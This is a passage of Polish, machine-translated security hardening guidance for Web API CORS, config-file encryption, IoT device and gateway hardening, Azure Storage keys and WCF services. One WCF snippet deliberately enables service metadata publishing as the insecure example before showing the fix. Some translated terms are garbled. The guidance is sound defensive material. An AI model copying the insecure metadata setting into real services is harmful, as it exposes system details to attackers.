Należy pamiętać, że ma to na celu zapewnienie, że lista źródeł w atrybucie EnableCors jest ustawiona na skończoną i zaufany zestaw źródeł. Niewłaściwe skonfigurowanie tego ustawienia (np. ustawienie wartości "*") umożliwi złośliwym lokacjom wyzwalanie żądań między źródłami w interfejsie API bez żadnych ograniczeń, >sprawia to, że interfejs API narażony na ataki CSRF. 

### <a name="example"></a>Przykład
Aby wyłączyć mechanizm CORS dla kontrolera lub akcji, Użyj atrybutu [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Szyfruj sekcje plików konfiguracji internetowego interfejsu API, które zawierają dane poufne

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Instrukcje: szyfrowanie sekcji konfiguracyjnych w ASP.NET 2,0 przy użyciu funkcji DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [Określanie dostawcy konfiguracji chronionej](/previous-versions/68ze1hb2(v=vs.140)) [przy użyciu Azure Key Vault do ochrony kluczy tajnych aplikacji](/azure/architecture/multitenant-identity/web-api) |
| **Kroki** | Pliki konfiguracji, takie jak Web.config, appsettings.jssą często używane do przechowywania informacji poufnych, w tym nazw użytkowników, haseł, parametrów połączenia bazy danych i kluczy szyfrowania. Jeśli te informacje nie są chronione, aplikacja jest narażona na osoby atakujące lub Złośliwi użytkownicy otrzymujące poufne informacje, takie jak nazwy użytkowników kont i hasła, nazwy baz danych i nazwy serwerów. Na podstawie typu wdrożenia (Azure/on-Premium) Zaszyfruj poufne sekcje plików konfiguracyjnych za pomocą funkcji DPAPI lub usług, takich jak Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Upewnij się, że wszystkie interfejsy administracyjne są zabezpieczone przy użyciu silnych poświadczeń

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Wszystkie interfejsy administracyjne, które są ujawniane przez urządzenie lub bramę pola, powinny być zabezpieczone przy użyciu silnych poświadczeń. Ponadto wszystkie inne uwidocznione interfejsy, takie jak Wi-Fi, SSH, udziały plików, FTP powinny być zabezpieczone silnymi poświadczeniami. Nie należy używać domyślnych słabych haseł. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Upewnij się, że nieznany kod nie może zostać wykonany na urządzeniach

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie szyfrowania urządzeń z bezpiecznym rozruchem i blokowaniem bitów w systemie Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Kroki** | Bezpieczny rozruch przy użyciu interfejsu UEFI ogranicza system do zezwalania na wykonywanie plików binarnych podpisanych przez określony urząd. Ta funkcja zapobiega wykonywaniu nieznanego kodu na platformie i potencjalnie osłabia stan bezpieczeństwa. Włącz bezpieczny rozruch przy użyciu interfejsu UEFI i Ogranicz listę urzędów certyfikacji, które są zaufane pod kątem podpisywania kodu. Podpisz cały kod wdrożony na urządzeniu przy użyciu jednego z zaufanych urzędów. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Szyfrowanie systemu operacyjnego i dodatkowych partycji urządzenia IoT z funkcją blokowania bitowego

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | System Windows 10 IoT Core implementuje uproszczoną wersję szyfrowania urządzeń, która ma silną zależność od obecności modułu TPM na platformie, w tym niezbędny protokół preOS w interfejsie UEFI, który przeprowadza niezbędne pomiary. Te pomiary preOS zapewniają, że system operacyjny później ma ostateczny zapis sposobu uruchomienia systemu operacyjnego. Szyfruj partycje systemu operacyjnego przy użyciu programu bit-Lock i wszystkie dodatkowe partycje również w przypadku przechowywania poufnych danych. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Upewnij się, że na urządzeniach są włączone tylko minimalne usługi/funkcje

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Nie należy włączać ani wyłączać żadnych funkcji ani usług w systemie operacyjnym, które nie są wymagane do działania rozwiązania. Na przykład jeśli urządzenie nie wymaga wdrożenia interfejsu użytkownika, zainstaluj rdzeń Windows IoT w trybie bezobsługowym. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Szyfrowanie systemu operacyjnego i dodatkowych partycji bramy pola IoT z usługą Unlocker

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama pola IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | System Windows 10 IoT Core implementuje uproszczoną wersję szyfrowania urządzeń, która ma silną zależność od obecności modułu TPM na platformie, w tym niezbędny protokół preOS w interfejsie UEFI, który przeprowadza niezbędne pomiary. Te pomiary preOS zapewniają, że system operacyjny później ma ostateczny zapis sposobu uruchomienia systemu operacyjnego. Szyfruj partycje systemu operacyjnego przy użyciu programu bit-Lock i wszystkie dodatkowe partycje również w przypadku przechowywania poufnych danych. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Upewnij się, że domyślne poświadczenia logowania bramy pola są zmieniane podczas instalacji

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama pola IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Upewnij się, że domyślne poświadczenia logowania bramy pola są zmieniane podczas instalacji |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Upewnij się, że brama chmury implementuje proces, aby zapewnić aktualność oprogramowania układowego podłączonych urządzeń

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama usługi IoT Cloud | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Wybór bramy — IoT Hub platformy Azure |
| **Odwołania**              | [IoT Hub Omówienie zarządzania urządzeniami](../../iot-hub/iot-hub-device-management-overview.md), [Aktualizowanie oprogramowania układowego urządzenia](../../iot-hub/tutorial-firmware-update.md) |
| **Kroki** | LWM2M to protokół z usługi Open Mobile Alliance for IoT zarządzanie urządzeniami. Zarządzanie urządzeniami w usłudze Azure IoT umożliwia współpracę z urządzeniami fizycznymi przy użyciu zadań urządzeń. Upewnij się, że brama chmury implementuje proces, aby regularnie chronić dane na urządzeniu i innych konfiguracji przy użyciu usługi Azure IoT Hub Device Management. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Upewnij się, że urządzenia mają kontrolki zabezpieczeń punktu końcowego skonfigurowane zgodnie z zasadami organizacji

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Granica zaufania maszyny | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Upewnij się, że urządzenia mają kontrolę zabezpieczeń punktów końcowych, takich jak bit-Lock dla szyfrowania na poziomie dysku, oprogramowanie antywirusowe z zaktualizowanymi sygnaturami, zaporą opartą na hoście, uaktualnieniami systemu operacyjnego, zasadami grupy itp. są skonfigurowane zgodnie z zasadami zabezpieczeń organizacji. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Zapewnianie bezpiecznego zarządzania kluczami dostępu do usługi Azure Storage

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Przewodnik po zabezpieczeniach usługi Azure Storage — zarządzanie kluczami konta magazynu](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Kroki** | <p>Magazyn kluczy: zaleca się przechowywanie kluczy dostępu do usługi Azure Storage w Azure Key Vault jako klucz tajny oraz pobieranie klucza z magazynu kluczy przez aplikacje. Jest to zalecane z następujących powodów:</p><ul><li>Aplikacja nigdy nie będzie zawierała klucza magazynu stałe w pliku konfiguracyjnym, co spowoduje usunięcie tej drogi do uzyskiwania dostępu do kluczy bez określonego uprawnienia</li><li>Dostęp do kluczy można kontrolować za pomocą Azure Active Directory. Oznacza to, że właściciel konta może udzielić dostępu do kilku aplikacji, które muszą pobrać klucze z Azure Key Vault. Inne aplikacje nie będą mogły uzyskać dostępu do kluczy bez udzielania im uprawnień</li><li>Ponowne generowanie klucza: zaleca się utworzenie procesu ponownego generowania kluczy dostępu do usługi Azure Storage ze względów bezpieczeństwa. Szczegółowe informacje o tym, dlaczego i jak planować ponowne generowanie kluczy, zostały udokumentowane w artykule referencyjnym Przewodnik po zabezpieczeniach usługi Azure Storage</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli jest włączona funkcja CORS w usłudze Azure Storage

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Pomoc techniczna dotycząca mechanizmu CORS dla usług Azure Storage](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Kroki** | Usługa Azure Storage umożliwia włączenie funkcji CORS — udostępnianie zasobów między źródłami. Dla każdego konta magazynu można określić domeny, które mogą uzyskiwać dostęp do zasobów w ramach tego konta magazynu. Domyślnie mechanizm CORS jest wyłączony na wszystkich usługach. Mechanizm CORS można włączyć za pomocą interfejsu API REST lub biblioteki klienta usługi Storage w celu wywołania jednej z metod ustawiania zasad usługi. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Włącz funkcję ograniczania funkcjonalności usług WCF

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | .NET Framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [wzmacnianie Królestwa](https://vulncat.fortify.com) |
| **Kroki** | <p>Użycie zasobów systemowych może nie należeć do limitu wyczerpania zasobów i ostatecznie odmowy usługi.</p><ul><li>**Wyjaśnienie:** Windows Communication Foundation (WCF) oferuje możliwość ograniczania żądań obsługi. Umożliwienie zbyt wielu żądań klientów może obciążyć system i wyczerpać jego zasoby. Z drugiej strony, zezwolenie na niewielką liczbę żądań do usługi może uniemożliwić korzystanie z usługi przez uprawnionym użytkownikom. Każda usługa powinna być poprawna i skonfigurowana do zezwalania na odpowiednią ilość zasobów.</li><li>**Zalecenia** Włącz funkcję ograniczania funkcjonalności usługi WCF i Ustaw limity odpowiednie dla aplikacji.</li></ul>|

### <a name="example"></a>Przykład
Poniżej przedstawiono przykładową konfigurację z włączonymi ograniczeniami:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF — ujawnienie informacji za poorednictwem metadanych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | .NET Framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [wzmacnianie Królestwa](https://vulncat.fortify.com) |
| **Kroki** | Metadane mogą pomóc atakującym uzyskać informacje o systemie i zaplanowaniu formy ataku. Usługi WCF można skonfigurować w taki sposób, aby uwidaczniać metadane. Metadane oferują szczegółowe informacje opisujące usługi i nie powinny być emitowane w środowiskach produkcyjnych. `HttpGetEnabled`  /  `HttpsGetEnabled` Właściwości klasy ServiceMetadata definiuje, czy usługa będzie uwidaczniać metadane | 

### <a name="example"></a>Przykład
Poniższy kod nakazuje programowi WCF emitowanie metadanych usługi
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Nie emituj metadanych usługi w środowisku produkcyjnym. Ustaw właściwości HttpGetEnabled/HttpsGetEnabled klasy ServiceMetadata na wartość false. 

### <a name="example"></a>Przykład
Poniższy kod instruuje program WCF, aby nie rozgłaszał metadanych usługi. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```